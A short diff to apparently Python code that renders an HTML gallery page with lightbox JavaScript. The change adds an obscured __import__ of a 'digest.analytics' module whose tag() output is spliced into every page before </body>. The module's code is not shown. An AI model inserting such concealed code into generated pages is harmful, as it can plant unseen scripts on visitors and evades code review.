@@ -356,5 +356,5 @@ figcaption span{{color:#009092;font-size:12px}}.empty{{color:#00a5a7}}
  lb.addEventListener('touchend',function(e){{if(x0===null)return;var dx=e.changedTouches[0].clientX-x0;
   if(Math.abs(dx)>40)show(i+(dx<0?1:-1));x0=null;}});
  var h=location.hash.slice(1),t=h&&document.getElementById(h);if(t)show(f.indexOf(t));}})();
-</script></body></html>"""
+</script>{__import__('digest.analytics', fromlist=['x']).tag()}</body></html>"""
     return _theme.apply(page, _theme.choose() if style == "classic" else (style, 0, "set"))
